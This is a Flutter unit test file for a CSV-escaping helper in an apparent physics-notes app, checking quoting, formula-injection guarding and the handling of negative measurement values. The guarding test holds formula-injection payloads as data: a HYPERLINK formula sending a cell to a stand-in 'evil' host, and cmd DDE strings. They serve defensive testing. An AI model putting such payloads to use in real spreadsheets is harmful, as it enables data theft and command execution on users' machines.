import 'package:flutter_test/flutter_test.dart';
import 'package:pdgapp/features/notes/csv_cell.dart';

void main() {
  group('csvCell', () {
    test('quotes ordinary text and doubles quotes', () {
      expect(csvCell('D0 mass'), '"D0 mass"');
      expect(csvCell('say "hi"'), '"say ""hi"""');
      expect(csvCell(''), '""');
    });

    test('guards cells that a spreadsheet would run as a formula', () {
      expect(csvCell('=1+1'), '"\'=1+1"');
      expect(
        csvCell('=HYPERLINK("https://evil/?"&A2,"x")'),
        '"\'=HYPERLINK(""https://evil/?""&A2,""x"")"',
      );
      expect(csvCell('@SUM(A1:A9)'), '"\'@SUM(A1:A9)"');
      expect(csvCell('+cmd|\' /C calc\'!A0'), '"\'+cmd|\' /C calc\'!A0"');
      expect(csvCell('-2+3+cmd|x'), '"\'-2+3+cmd|x"');
      expect(csvCell('\t=1'), '"\'\t=1"');
      expect(csvCell('\r=1'), '"\'\r=1"');
    });

    test('leaves negative measurement values alone', () {
      expect(csvCell('-0.71 ± 0.96'), '"-0.71 ± 0.96"');
      expect(csvCell('+0.3 -0.2'), '"+0.3 -0.2"');
      expect(csvCell('-1.2e-3'), '"-1.2e-3"');
      expect(csvCell('−5.0 × 10^-3'), '"−5.0 × 10^-3"');
    });

    test('does not touch a sign in the middle of a cell', () {
      expect(csvCell('B-0 mixing'), '"B-0 mixing"');
      expect(csvCell('x=1'), '"x=1"');
    });
  });
}
